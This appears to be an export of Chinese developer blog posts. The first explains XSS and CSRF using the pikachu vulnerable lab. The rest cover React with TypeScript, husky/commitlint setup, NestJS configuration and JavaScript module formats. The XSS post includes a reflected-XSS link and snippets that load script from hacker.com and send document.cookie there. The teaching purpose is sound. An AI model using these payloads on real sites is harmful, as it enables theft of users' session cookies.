[{"title":"XSS和CSRF的区别及防御","path":"/2022/03/08/XSS和CSRF的区别及防御/","content":"在 Web 安全领域，XSS 和 CSRF 是个老生常谈的都行了，特别是面试的时候，但是还是有很多同学将它们搞混。本文将简单的介绍下它们的区别，以及常见的防御手段。 介绍之前，先上下维基百科： XSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。 CSRF:跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。 XSS用“人话说”，XSS 就是恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。 XSS攻击可以分为3类：反射型（非持久型）、存储型（持久型）、基于DOM。 反射型反射型是指xss代码在请求的url中，而后提交到服务器，服务器解析后，XSS代码随着响应内容一起传给客户端进行解析执行。（直接反射显示在页面） 流程图如下： 通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者构造带有恶意XSS代码的URL—&gt;别的用户访问这个URL—&gt;恶意代码被服务器解析—&gt;传递给前端渲染实现攻击。 如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它 pikachu，是个开源的漏洞测试平台，按照 README 启动项目后，跳转到「反射型xss」页面，在输入框中输入「kobe」后，点击 submit，打开控制台，观察后端返回的 html： 可以看到，输入框的内容出现在 html 和链接里，这就给我们带来了可乘之机，如果输入框里输入的是一段 script 脚本呢？ 脚本被插入到 htmlh中，并且被执行。这时将这段链接 http://localhost:8095/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&amp;submit=submit# 发送给用户，诱导用户点击，就完成了一次 XSS 攻击。 现在的脚本只是 alert 用户的 cookie，还停留在恶搞的层面，如果将 cookie 发送到恶意攻击者的服务器上，那就是一起严重的安全事故了。 1&lt;script src=\"http://hacker.com/hacker.js\"&gt;&lt;/script&gt; 123var img = new Image();img.src = \"http://hacker.com/hack.png?q=\" + document.cookie;document.body.append(img); 存储型存储型 XSS 会把用户输入的数据 “存储” 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。 反射型 XSS 每次攻击还需要诱导用户点击诱饵链接，如果用户无动于衷，攻击者也是无可奈何，而存储型 XSS 一旦将恶意脚本入库了，任何访问到这段脚本用户都会中招。 比较常见的一个场景是攻击者在社区或论坛上写下一篇包含恶意 JavaScript 代码的文章或评论，文章或评论发表后，所有访问该文章或评论的用户，都会在他们的浏览器中执行这段恶意的 JavaScript 代码。 流程图如下： 通过流程图可以很容易知道存储型XSS的常用攻击流程为：攻击者前端插入恶意XSS代码—&gt;后端不做处理传入数据库—&gt;别的用户访问页面—&gt;后端从数据库中调用XSS代码—&gt;前端渲染(执行js脚本)恶意代码实现攻击。 这里还是用 pikachu 来实操下，打开「存储型xss」页面，输入框中输入一段 script 脚本： 提交后并刷新页面，这段脚本被注入到 html 中，并执行了"},{"title":"在 React 项目中优雅地使用 Typescript","path":"/2021/04/19/在React项目中优雅地使用Typescript/","content":"TypeScript 是 Javascript 的超集，扩展了 JavaScript 的语法，给 JavaScript 带来了静态类型支持，了解如何在 React 项目中优雅地使用 Typescript，能帮助我们写出更优雅的代码。 「优雅」的含义： 减少编写冗余的类型定义、类型标注，充分利用ts的自动类型推断，以及外部提供的类型声明。 类型安全：提供足够的类型信息来避免运行时错误，让错误暴露在开发期。这些类型信息同时能够提供代码补全、跳转到定义等功能。 组件定义函数组件1234567891011121314151617import * as React from 'react';// 如果在tsconfig中设置了\"allowSyntheticDefaultImports\": true// 你还可以更精练地import react：// import React from \"react\";interface IProps { // CSSProperties提供样式声明的类型信息 // 用户传入style的时候就能够获得类型检查和代码补全 style?: React.CSSProperties; // 使用@types/react提供的事件类型定义，这里指定event.target的类型是HTMLButtonElement onClick(event: React.MouseEvent&lt;HTMLButtonElement&gt;): void; // ...}const MyComponent: React.FC&lt;IProps&gt; = (props) =&gt; { const { children, ...restProps } = props; return &lt;div {...restProps}&gt;{children}&lt;/div&gt;;} FC是FunctionComponent的缩写。 IProps无需声明children属性的类型。React.FC会自动为props添加这个属性类型。当然，如果children期望一个render prop，或者期望其他特殊的值，那么你还是要自己给children声明类型，而不是使用默认的React.ReactNode。 props无需做类型标注。 函数组件defaultProps（Deprecate）如果你需要定义defaultProps，那么不要使用React.FC，因为React.FC对defaultProps的支持不是很好： 1234567const defaultProps = { who: \"Johny Five\"};type IProps = { age: number } &amp; typeof defaultProps;export const Greet = (props: IProps) =&gt; { return &lt;div&gt;123&lt;/div&gt; };Greet.defaultProps = defaultProps; 事实上，一个提议在函数组件中废弃defaultProps的React rfc已经被接受，所以以后还是尽量减少在函数组件上使用defaultProps，使用ES6原生的参数解构+默认参数特性就已经能够满足需要： 1const TestFunction: FunctionComponent&lt;Props&gt; = ({ foo = \"bar\" }) =&gt; &lt;div&gt;{foo}&lt;/div&gt; 类组件12345678910111213141516171819interface IProps { message: string;}interface IState { count: number;}export class MyComponent extends React.Component&lt;IProps, IState&gt; { state: IState = { // duplicate IState annotation for better type inference count: 0 }; render() { return ( &lt;div&gt; {this.props.message} {this.state.count} &lt;/div&gt; ); }} 如果你通过声明state属性来初始化state，那么你需要为这个属性增加IState类型标注。虽然这与前面的React.Component&lt;IProps, IState&gt;有重复的嫌疑，但是这两者实际上是不同的： React.Component&lt;IProps, IState&gt;只是标注了基类的state属性类型。 而当你在子类声明state时，你可以为state标注一个【IState的子类型】作为override。这样，this.state会以子类中的state属性声明作为类型信息的来源。 建议使用函数组件。 可渲染节点类型可渲染节点就是：可以直接被组件渲染函数返回的值。 与可渲染节点有关的类型定义如下（摘录自[@types/react](https://github.com/DefinitelyTyped/DefinitelyTyped/blob/8a1b68be3a64e5d2aa1070f68cc935d668a976ad/types/react/index.d.ts#L187）： 12345type ReactText = string | number;type ReactChild = ReactElement | ReactText;interface ReactNodeArray extends Array&lt;ReactNode&gt; {}type ReactFragment = {} | ReactNodeArray;type ReactNode = ReactChild | ReactFragment | ReactPortal | boolean | null | undefined; 组件类型 React.FC&lt;Props&gt;（即 React.FunctionComponent&lt;Props&gt;） React.Component&lt;Props, State&gt; React.ComponentType&lt;Props&gt;（即ComponentClass&lt;P&gt; | FunctionComponent&lt;P&gt;） 在写HOC的时候经常用到。 123const withState = &lt;P extends WrappedComponentProps&gt;( WrappedComponent: React.ComponentType&lt;P&gt;,) =&gt; { ... 获取并扩展原生元素的props类型比如，以下例子获取并扩展了&lt;button&gt;的props类型： 123export const PrimaryButton = ( props: Props &amp; React.HTMLProps&lt;HTMLButtonElement&gt;) =&gt; &lt;Button size={ButtonSizes.default} {...props} /&gt;; PrimaryButton能够接受所有原生&lt;button&gt;所接受的props。关键在于React.HTMLProps。 获取并扩展第三方组件的props类型123456import { Button } from \"library\"; // but doesn't export ButtonProps! oh no!type ButtonProps = React.ComponentProps&lt;typeof Button&gt;; // no problem! grab your own!type AlertButtonProps = Omit&lt;ButtonProps, \"onClick\"&gt;; // modifyconst AlertButton: React.FC&lt;AlertButtonProps&gt; = props =&gt; ( &lt;Button onClick={() =&gt; alert(\"hello\")} {...props} /&gt;); 事件类型@types/react提供了各种事件的类型，比如以下是使用React.FormEvent的例子： 1234567891011121314151617181920class App extends React.Component&lt; {}, { text: string }&gt; { state = { text: '', } onChange = (e: React.FormEvent&lt;HTMLInputElement&gt;): void =&gt; { this.setState({ text: e.currentTarget.value }) } render() { return ( &lt;div&gt; &lt;input type=\"text\" value={this.state.text} onChange={this.onChange} /&gt; &lt;/div&gt; ) }} 在React中，所有事件（包括FormEvent、KeyboardEvent、MouseEvent等）都是SyntheticEvent的子类型。他们在@types/react中定义如下： 12345678910111213141516171819202122232425262728293031// DOM事件的基本属性都定义在这里interface BaseSyntheticEvent&lt;E = object, C = any, T = any&gt; { nativeEvent: E; currentTarget: C; target: T; bubbles: boolean; cancelable: boolean; defaultPrevented: boolean; eventPhase: number; isTrusted: boolean; preventDefault(): void; isDefaultPrevented(): boolean; stopPropagation(): void; isPropagationStopped(): boolean; persist(): void; timeStamp: number; type: string;}interface SyntheticEvent&lt;T = Element, E = Event&gt; extends BaseSyntheticEvent&lt;E, EventTarget &amp; T, EventTarget&gt; {}// 具体的事件类型：interface FormEvent&lt;T = Element&gt; extends SyntheticEvent&lt;T&gt; {}interface KeyboardEvent&lt;T = Element&gt; extends SyntheticEvent&lt;T, NativeKeyboardEvent&gt; { altKey: boolean; // ...}interface MouseEvent&lt;T = Element, E = NativeMouseEvent&gt; extends SyntheticEvent&lt;T, E&gt; { altKey: boolean; // ...}// ..."},{"title":"lerna项目中集成husky、lint-staged、commitlint和cz-customizable","path":"/2021/04/02/lerna项目中集成husky、lint-staged、commitlint和cz-customizable/","content":"Monorepo 是针对单仓库、多 package 的流行解决方案, lerna 是它的一种实现。 说明重要package版本说明： “husky”: “^6.0.0” “lint-staged”: “^10.5.4” “@commitlint/cli”: “^12.0.1” “@commitlint/config-conventional”: “^12.0.1” “cz-customizable”: “^6.3.0” 配置husky在lerna项目根目录中安装husky: 1yarn add husky -D 注意：husky v4和v6版本的配置方式大相径庭，这里只介绍v6版本的配置方式，v4的网上一搜一大把，这里不过多介绍 在package.json的scripts中添加\"prepare\": \"husky install\"，并运行这条命令： 1npm set-script prepare \"husky install\" &amp;&amp; npm run prepare 添加一个hook: 1npx husky add .husky/pre-commit \"npm test\" 上面这个命令会在.husky目录下新建一个pre-commit文件，其内容如下： 12345#!/bin/sh. \"$(dirname \"$0\")/_/husky.sh\"npm test 以上都是手动安装husky的过程，当然官方也提供了一键安装和配置脚本，推荐使用： 123npx husky-init &amp;&amp; npm install # npmnpx husky-init &amp;&amp; yarn # Yarn 1yarn dlx husky-init --yarn2 &amp;&amp; yarn # Yarn 2 如果使用的是v4版本的husky，想升级到v6，可以使用以下命名，一键迁移： 1234567891011121314// npmnpm install husky@6 --save-dev \\ &amp;&amp; npx husky-init \\ &amp;&amp; npm exec -- github:typicode/husky-4-to-6 --remove-v4-config // yarn 1yarn add husky@6 --dev \\ &amp;&amp; npx husky-init \\ &amp;&amp; npm exec -- github:typicode/husky-4-to-6 --remove-v4-config// yarn 2yarn add husky@6 --dev \\ &amp;&amp; yarn dlx husky-init --yarn2 \\ &amp;&amp; npm exec -- github:typicode/husky-4-to-6 --remove-v4-config 更多配置，详见官方文档：https://typicode.github.io/husky/#/ 配置lint-staged在lerna项目中，由于所有子项目公用一个 repo 源代码仓库，因此它的 husky 钩子只能建立在最顶层目录； 而每次 commit 都很有可能是多个子项目都有改动，这个时候使用 lint-staged 时，就不但要区分文件类型，还要区分改动文件所在的子项目（因为不同的子项目可能会有不同的校验处理）。 这时，我们可以使用 lerna 命令来实现对“哪个子项目有修改”的判断；而 lint-staged 就需要安装在任何一个需要做校验的子项目中。 添加或修改.husky目录下的pre-commit钩子如下： 12345#!/bin/sh. \"$(dirname \"$0\")/_/husky.sh\"lerna run --concurrency 1 --stream precommit --since HEAD --exclude-dependents 其中，precommit 是在pre-commit钩子中触发的子项目的命令 在子项目中安装和配置lint-staged，并添加precommit命令 安装lint-staged： 1lerna add lint-staged --scope=xxxx -D 在添加precommit命令： 1\"precommit\": \"lint-staged\" 配置lint-staged： 12345\"lint-staged\": { \"*.{ts,tsx,js,jsx}\": [ \"eslint\" ]}, 更多配置，详见官方文档：https://github.com/okonet/lint-staged#readme 配置commitlint和cz-customizable每个团队对提交的commit message格式有约定俗称的要求，但是没有一个统一的规范，导致大家提交的commit message或多或少不太一样。因此，需要一个工具来帮助大家统一commit message的格式，也方便后续的分析和拓展。 cz-customizable是一个帮助书写commit message的工具，而commitlint是一个校验commit message的工具。 安装commitlint和cz-customizable: 1yarn add @commitlint/cli @commitlint/config-conventional cz-customizable -D 添加commit-msg钩子 1npx husky add .husky/commit-msg \"yarn commitlint --edit\" 生成如下文件： 1234#!/bin/sh. \"$(dirname \"$0\")/_/husky.sh\"yarn commitlint --edit 在package.json中添加以下配置： 123456789101112{ ... \"config\": { \"commitizen\": { \"path\": \"./node_modules/cz-customizable\" }, \"cz-customizable\": { \"config\": \"./.cz-config.js\" } }, ...} 在项目根目录中新建.cz-config.js文件，内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051module.exports = { types: [ { value: 'feat', name: 'feat: A new feature' }, { value: 'fix', name: 'fix: A bug fix' }, { value: 'style', name: 'style: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc)', }, { value: 'refactor', name: 'refactor: A code change that neither fixes a bug nor adds a feature', }, { value: 'revert', name: 'revert: Revert to a commit' }, { value: 'chore', name: 'chore: Changes to the build process or auxiliary tools and libraries such as documentation generation', }, { value: 'docs', name: 'docs: Documentation only changes' }, { value: 'perf', name: 'perf: A code change that improves performance', }, { value: 'test', name: 'test: Adding missing tests' }, ], scopes: [ { name: 'frontend' }, { name: 'backend' }, { name: 'service' }, ], messages: { type: \"Select the type of change that you're committing:\", scope: \" Select the scope of change that you're committing:\", // used if allowCustomScopes is true customScope: 'Denote the custom scope:', subject: 'Write a SHORT, IMPERATIVE tense description of the change: ', body: 'Provide a LONGER description of the change (optional). Use \"|\" to break new line: ', breaking: 'List any BREAKING CHANGES (optional): ', footer: 'List any ISSUES CLOSED by this change (optional). E.g.: #31, #34: ', confirmCommit: 'Are you sure you want to proceed with the commit above?', }, allowCustomScopes: true,} 在项目根目录中新建.commitlintrc.js文件，内容如下： 1234567891011const typeEnum = require('./.cz-config');module.exports = { extends: ['@commitlint/config-conventional'], rules: { 'type-enum': [2, 'always', typeEnum.types.map((i) =&gt; i.value)], 'scope-enum': [2, 'always', typeEnum.scopes.map((i) =&gt; i.name)], 'scope-empty': [2, 'never'], },}; 配置完成后，每次提交commit时，可以使用git cz替换git commit命令，从而辅助我们更加规范的书写commit message。 更多详细配置，可以参考这篇文章：https://juejin.cn/post/6844903831893966856 总结以上就是我对如何在lerna项目中配置husky、lint-staged和Cz工具的一些粗略认知，当然不仅仅是lerna项目，也适用于任何前端项目。 链接 husky官文文档 lint-staged官方文档 Cz工具集使用介绍"},{"title":"NestJS - 配置","path":"/2021/03/17/NestJS - 配置/","content":"应用程序通常运行在不同的环境，例如，开发有开发环境、测试环境，线上有预发布环境、生产环境，而运行在不同的环境，需要有不同的配置，例如数据库的配置等。 在Node中，外部定义的环境变量通过procress.env全局可见。在Node.js应用程序中，通常使用.env文件来配置这些环境变量，其中每个键代表一个特定的值，以代表每个环境。 解析.env文件并加载到procress.env中，就需要使用dotenv这个包了，但是Nest提供了一个配置环境变量的软件包 - @nestjs/config，其内部依赖了dotenv。 安装@nestjs/config12345// npm$ npm i --save @nestjs/config// yarn$ yarn add @nestjs/config 简单使用安装完成后，我们可以导入ConfigModule。通常，我们将其导入根目录AppModule并使用. forRoot()静态方法控制其行为。在此步骤中，将解析并生成环境变量键/值对。稍后，我们将在其他功能模块中看到一些用于访问的ConfigService类的选项ConfigModule。 1234567import { Module } from '@nestjs/common';import { ConfigModule } from '@nestjs/config';@Module({ imports: [ConfigModule.forRoot()],})export class AppModule {} 上面的代码将从.env默认位置（项目根目录）加载并解析文件，将文件中的键/值对.env与分配给其的环境变量合并process.env，并将结果存储在私有结构中，您可以通过访问该私有结构ConfigService。该forRoot()方法注册了ConfigService提供程序，该提供程序提供了get()一种读取这些已解析/合并的配置变量的方法。由于@nestjs/config依赖于dotenv，因此它使用该程序包的规则来解决环境变量名称中的冲突。当密钥在运行时环境中作为环境变量（例如，通过OS shell导出之类export DATABASE_USER=test）和在.env文件中同时存在时，运行时环境变量优先。 示例.env文件如下所示： 12DATABASE_USER=testDATABASE_PASSWORD=test 自定义ENV文件路径默认情况下，程序会在应用程序的根目录中查找.env文件。要为.env文件指定其他路径，请设置forRoot()的可选属性envFilePath，如下所示： 123ConfigModule.forRoot({ envFilePath: '.development.env',}); 您还可以为.env文件指定多个路径，如下所示： 123ConfigModule.forRoot({ envFilePath: ['.env.development.local', '.env.development'],}); 如果在多个文件中找到一个变量，则第一个优先。 在实际开发中，往往有多个配置文件，比如开发环境使用.development.env配置文件，测试环境使用.test.env配置文件，生产环境使用.production.env配置文件，然后使用不同的启动命令，启用不同的配置文件，示例如下： 1234567891011// package.json{ ... \"scripts\": { \"start\": \"cross-env NODE_ENV=development nest start\", \"start:dev\": \"cross-env NODE_ENV=development nest start --watch\", \"start:prod\": \"cross-env NODE_ENV=production node dist/main\", \"test\": \"cross-env NODE_ENV=test jest\", }, ...} 安装cross-env，使用它跨平台的设置环境变量 123ConfigModule.forRoot({ envFilePath: `${process.env.NODE_ENV || 'development'}.env`,}); 使用全局module如果要ConfigModule在其他模块中使用，则需要将其导入（这是所有Nest模块的标准配置）。或者，通过将options对象的isGlobal属性设置为true，将其声明为全局模块，如下所示。在这种情况下，一旦ConfigModule被加载到根模块中，就不需要在其他模块中导入ConfigModule了 123ConfigModule.forRoot({ isGlobal: true,}); 自定义配置文件对于更复杂的项目，可以使用自定义配置文件返回嵌套的配置对象。这允许您按功能对相关配置设置进行分组（例如，与数据库相关的设置），并将相关设置存储在单个文件中，以帮助独立管理它们。 自定义配置文件导出一个工厂函数，该函数返回一个配置对象。配置对象可以是任何任意嵌套的普通JavaScript对象。process.env对象将包含完全解析的环境变量key-value对（如上所述，.env文件和外部定义的变量被解析和合并）。由于你控制了返回的配置对象，你可以添加任何所需的逻辑来将值投射到一个适当的类型，设置默认值等。例如 1234567export default () =&gt; ({ port: parseInt(process.env.PORT, 10) || 3000, database: { host: process.env.DATABASE_HOST, port: parseInt(process.env.DATABASE_PORT, 10) || 5432 }}); 将其传给ConfigModule.forRoot()的load属性，来加载这个自定义配置： 12345678910import configuration from './config/configuration';@Module({ imports: [ ConfigModule.forRoot({ load: [configuration], }), ],})export class AppModule {} load属性是个数组，允许加载多个自定义配置文件 通过自定义配置文件，我们还可以管理自定义文件，如YAML文件。下面是一个使用YAML格式的配置的例子。 123456789101112http: host: 'localhost' port: 8080db: postgres: url: 'localhost' port: 5432 database: 'yaml-db' sqlite: database: 'sqlite.db' 为了读取和解析YAML文件，我们可以利用js-yaml包。 12$ npm i js-yaml$ npm i -D @types/js-yaml 安装软件包后，我们将使用yaml#load函数来加载刚刚在上面创建的YAML文件。 1234567891011import { readFileSync } from 'fs';import * as yaml from 'js-yaml';import { join } from 'path';const YAML_CONFIG_FILENAME = 'config.yml';export default () =&gt; { return yaml.load( fs.readFileSync(join(__dirname, YAML_CONFIG_FILENAME), 'utf8'), );}; 使用ConfigService要从ConfigService中访问配置值，我们首先得注入ConfigService，和使用其他provider一样，我们需要将其加入@Module的imports属性中（如果将ConfigModule配置成全局module，则可以忽略这一步） 1234@Module({ imports: [ConfigModule], // ...}) 然后我们可以使用标准的构造函数注入: 123// import { ConfigService } from '@nestjs/config';constructor(private configService: ConfigService) {} 获取 12345// get an environment variableconst dbUser = this.configService.get&lt;string&gt;('DATABASE_USER');// get a custom configuration valueconst dbHost = this.configService.get&lt;string&gt;('database.host'); 如上所示，使用configService.get()方法通过传递变量名来获取一个简单的环境变量。你可以通过传递类型来做TypeScript类型提示，如上所示(例如，get&lt;string&gt;(…))。get()方法也可以遍历一个嵌套的自定义配置对象（通过自定义配置文件创建），如上面第二个例子所示。 你也可以使用一个接口作为类型提示来获得整个嵌套的自定义配置对象。 123456789interface DatabaseConfig { host: string; port: number;}const dbConfig = this.configService.get&lt;DatabaseConfig&gt;('database');// you can now use `dbConfig.port` and `dbConfig.host`const port = dbConfig.port; get()方法还需要一个可选的第二个参数，定义一个默认值，当键不存在时，将返回默认值，如下所示: 12// use \"localhost\" when \"database.host\" is not definedconst dbHost = this.configService.get&lt;string&gt;('database.host', 'localhost'); ConfigService有一个可选的泛型(类型参数)来帮助防止访问不存在的配置属性。使用方法如下: 12345678910111213interface EnvironmentVariables { PORT: number; TIMEOUT: string;}// somewhere in the codeconstructor(private configService: ConfigService&lt;EnvironmentVariables&gt;) { // this is valid const port = this.configService.get&lt;number&gt;('PORT'); // this is invalid as URL is not a property on the EnvironmentVariables interface const url = this.configService.get&lt;string&gt;('URL');} 配置命名空间ConfigModule允许您定义和加载多个自定义配置文件，如上面的自定义配置文件所示。您可以使用嵌套的配置对象管理复杂的配置对象层次，如该节所示。另外，您也可以使用 registerAs()函数返回一个 “namespaced “的配置对象，如下所示。 123456import { registerAs } from '@nestjs/config'; export default registerAs('database', () =&gt; ({ host: process.env.DATABASE_HOST, port: process.env.DATABASE_PORT || 5432})); 用forRoot()方法的参数对象的load属性加载一个命名空间的配置，与加载自定义配置文件的方式相同。 12345678910import databaseConfig from './config/database.config';@Module({ imports: [ ConfigModule.forRoot({ load: [databaseConfig], }), ],})export class AppModule {} 现在，要从database命名空间中获取host，使用点操作符。使用database作为属性名的前缀，对应于命名空间的名称（作为 registerAs() 函数的第一个参数传递）。 1const dbHost = this.configService.get&lt;string&gt;('database.host'); 一个合理的选择是直接注入database命名空间。这使我们能够从强类型化中获益。 123456// import { ConfigType } from '@nestjs/config';constructor( @Inject(databaseConfig.KEY) private dbConfig: ConfigType&lt;typeof databaseConfig&gt;,) {} 缓存环境变量由于访问process.env会很慢，你可以设置传递给ConfigModule.forRoot()的options对象的cache属性，以提高ConfigService的性能。 123ConfigModule.forRoot({ cache: true,}); 部分注册到目前为止，我们已经用forRoot()方法处理了根模块(如AppModule)中的配置文件。也许你有一个更复杂的项目结构，特定功能的配置文件位于多个不同的目录中。@nestjs/config包提供了一个叫做部分注册的功能，它只引用与每个功能模块相关联的配置文件，而不是在根模块中加载所有这些文件。在特性模块中使用forFeature()静态方法来执行这个部分注册，如下所示。 123456import databaseConfig from './config/database.config';@Module({ imports: [ConfigModule.forFeature(databaseConfig)],})export class DatabaseModule {} 校验环境变量如果所需的环境变量没有被提供或不符合某些验证规则，在应用程序启动时抛出异常是标准做法。@nestjsconfig包有两种不同的方式来实现这一点。 Joi内置验证器。使用Joi，你可以定义一个对象模式，并对其进行JavaScript对象验证。 一个自定义的validate()函数，它接受环境变量作为输入。 要使用Joi，我们必须安装Joi包: 1$ yarn add joi 最新版本的joi需要你运行Node v12或更高版本。旧版本的node请安装v16.1.8。这主要是在v17.0.2发布后，在构建的时候会出现错误。更多信息请参考其17.0.0发布说明(https://github.com/sideway/joi/issues/2262)。 现在我们可以定义一个Joi验证模式，并通过forRoot()方法的选项对象的validationSchema属性传递，如下图所示。 123456789101112131415import * as Joi from 'joi';@Module({ imports: [ ConfigModule.forRoot({ validationSchema: Joi.object({ NODE_ENV: Joi.string() .valid('development', 'production', 'test', 'provision') .default('development'), PORT: Joi.number().default(3000), }), }), ],})export class AppModule {} 默认情况下，所有的 schema keys 都被认为是可选的。这里，我们为 NODE_ENV和PORT设置了默认值，如果我们不在环境(.env文件或进程环境)中提供这些变量，就会使用这些变量。另外，我们也可以使用 required() 验证方法来要求必须在环境 (.env 文件或进程环境) 中定义一个值。在这种情况下，如果我们没有在环境中提供变量，验证步骤将抛出一个异常。关于如何构造验证模式，请参见Joi验证方法。 默认情况下，允许未知的环境变量（模式中键不存在的环境变量），并且不会触发验证异常。默认情况下，所有的验证错误都会被报告。你可以通过forRoot()选项对象的validationOptions键传递一个选项对象来改变这些行为。这个选项对象可以包含Joi验证选项提供的任何标准验证选项属性。例如，要反转上面的两个设置，可以传递这样的选项。 12345678910111213141516171819import * as Joi from 'joi';@Module({ imports: [ ConfigModule.forRoot({ validationSchema: Joi.object({ NODE_ENV: Joi.string() .valid('development', 'production', 'test', 'provision') .default('development'), PORT: Joi.number().default(3000), }), validationOptions: { allowUnknown: false, abortEarly: true, }, }), ],})export class AppModule {} @nestjsconfig包使用的默认设置是: allowUnknown：控制是否允许在环境变量中使用未知键。默认为true。 abortEarly： 如果为true，则在第一个错误时停止验证；如果为false，则返回所有错误。默认值为false。 请注意，一旦你决定传递一个validationOptions对象，你没有明确传递的任何设置都将默认为Joi标准默认值（而不是@nestjsconfig默认值）。例如，如果你在你的自定义validationOptions对象中没有指定allowUnknowns，它将有Joi默认值false。因此，在您的自定义对象中指定这两个设置可能是最安全的。 自定义校验函数另外，你也可以指定一个同步的validate函数，该函数接收一个包含环境变量的对象（来自env文件和进程），并返回一个包含验证过的环境变量的对象，这样你就可以在需要的时候转换它们。如果函数抛出一个错误，它将阻止应用程序的引导。 在这个例子中，我们将继续使用class-transformer和class-validator包。首先，我们必须定义。 一个具有验证约束的类， 一个使用 plainToClass 和 validateSync 函数的验证函数。 12345678910111213141516171819202122232425262728293031import { plainToClass } from 'class-transformer';import { IsEnum, IsNumber, validateSync } from 'class-validator';enum Environment { Development = \"development\", Production = \"production\", Test = \"test\", Provision = \"provision\",}class EnvironmentVariables { @IsEnum(Environment) NODE_ENV: Environment; @IsNumber() PORT: number;}export function validate(config: Record&lt;string, unknown&gt;) { const validatedConfig = plainToClass( EnvironmentVariables, config, { enableImplicitConversion: true }, ); const errors = validateSync(validatedConfig, { skipMissingProperties: false }); if (errors.length &gt; 0) { throw new Error(errors.toString()); } return validatedConfig;} 完成这些之后，使用validate函数作为ConfigModule的配置选项，如下所示: 12345678910import { validate } from './env.validation';@Module({ imports: [ ConfigModule.forRoot({ validate, }), ],})export class AppModule {} 自定义getter函数ConfigService定义了一个通用的get()方法，通过键来检索配置值。我们还可以添加getter函数，以实现更自然的编码风格。 12345678@Injectable()export class ApiConfigService { constructor(private configService: ConfigService) {} get isAuthEnabled(): boolean { return this.configService.get('AUTH_ENABLED') === 'true'; }} 现在我们可以使用getter函数如下: 12345678@Injectable()export class AppService { constructor(apiConfigService: ApiConfigService) { if (apiConfigService.isAuthEnabled) { // Authentication is enabled } }} 可扩展变量@nestjsconfig支持环境变量扩展。通过这种技术，你可以创建嵌套的环境变量，其中一个变量被引用到另一个变量的定义中。比如说 12APP_URL=mywebsite.comSUPPORT_EMAIL=support@${APP_URL} 通过这种结构，变量SUPPORT_EMAIL解析为support@mywebsite.com。请注意使用 ${...} 语法来触发解析 SUPPORT_EMAIL 定义中的变量 APP_URL 的值。 对于这个功能，@nestjsconfig包内部使用dotenv-expand。 使用传递给ConfigModule的forRoot()方法的选项对象中的expandVariables属性启用环境变量扩展，如下所示。 123456789@Module({ imports: [ ConfigModule.forRoot({ // ... expandVariables: true, }), ],})export class AppModule {} 在 main.ts 中使用虽然我们的配置是存储在service中的，但它仍然可以在main.ts文件中使用。这样，你就可以用它来存储变量，如应用程序端口或CORS host。 要访问它，你必须使用app.get()方法，然后是服务引用。 1const configService = app.get(ConfigService); 然后，你可以像往常一样，通过调用配置键的get方法来使用它。 1const port = configService.get('PORT'); 本文基本上是官文文档中有关配置部分的中文翻译（https://docs.nestjs.com/techniques/configuration），有时间再写个实战文章。"},{"title":"Javascript 模块管理","path":"/2020/08/29/Javascript 模块管理/","content":"CommonJSCommonJS是Node.js对模块开发的标准规范。 CommonJS module基本要求如下： 一个文件就是一个模块，拥有单独的作用域 普通方式定义的 变量、函数、对象都属于该模块内 通过 require 来加载模块 通过 exports 和 module.exports 来暴露模块中的内容 demo1: 1234567891011121314// module.jsmodule.exports = { name: \"zhang\", getName: function() { console.log(this.name); }, changeName: function(n) { this.name = n; }};// index.jsconst module = require(\"./module/index\");console.log(module)\t// {name: \"zhang\", getName: ƒ, changeName: ƒ} \"commons\" demo2: 1234567891011121314// module1.jsconst getParam = () =&gt; { console.log(a);};let a = 123;let b = 456;exports.a = a;exports.b = b;exports.getParam = getParam;// index.jsconst module1 = require(\"./module/index1\");consoel.log(module1, \"commons1\")\t// {a: 123, b: 456, getParam: ƒ} \"commons1\" demo3: 1234567891011121314151617// module2.jslet a = 123;const getSome = () =&gt; { console.log(\"yyy\");};const getA = () =&gt; { console.log(a);};exports.getSome = getSome;module.exports = getA;// index.jsconst module2 = require(\"./module/index2\");consoel.log(module2, \"commons2\")\t// function getA() {...} 总结 ： 通过这样的一个对比的例子就可以比较清晰的对比出 exports 和 module.exports 的区别:1、当 exports 和 module.exports 同时存在的时候，module.exports 会盖过 exports2、当模块内部全部是 exports 的时候， 就等同于 module.exports3、最后 我们就可以认定为 exports 其实就是 module.exports 的子集。 AMDAMD全称为异步模块定义, 是专门为浏览器中JavaScript环境设计的规范。 AMD设计出一个简洁的写模块API： define(id?, dependencies?, factory); 其中： id: 模块标识，可以省略。 dependencies: 所依赖的模块，可以省略。 factory: 模块的实现，或者一个JavaScript对象。如果为函数，它应该只被执行一次，如果是对象，此对象应该为模块的输出值。 使用RequireJS的require函数加载模块: require([dependencies], callback); dependencies: 表示所依赖的模块 callback: 一个回调函数，当前面指定的模块都加载成功后，它将被调用。加载的模块会以参数形式传入该函数，从而在回调函数内部就可以使用这些模块 base.js 123456define(function() { return { mix: function(source, target) { } };}); ui.js 1234567define(['base'], function(base) { return { show: function() { // todo with module base } }}); page.js 123define(['data', 'ui'], function(data, ui) { // init here}) data.js 1234define({ users: [], members: []}); 以上同时演示了define的三种用法 定义无依赖的模块（base.js） 定义有依赖的模块（ui.js，page.js） 定义数据对象模块（data.js） CMDAMD开始为摆脱CommonJS的束缚，开创性的提出了自己的模块风格。但后来又做了妥协，兼容了 CommonJS Modules/Wrappings 。所以就有了CMD, 它的语法如下: define(id?, dependencies?, factory); 因为CMD推崇一个文件一个模块，所以经常就用文件名作为模块id； CMD推崇依赖就近，所以一般不在define的参数中写依赖，而是在factory中写。 factory有三个参数： 1function(require, exports, module){} require: require 是一个方法，接受 模块标识 作为唯一参数，用来获取其他模块提供的接口； exports: exports 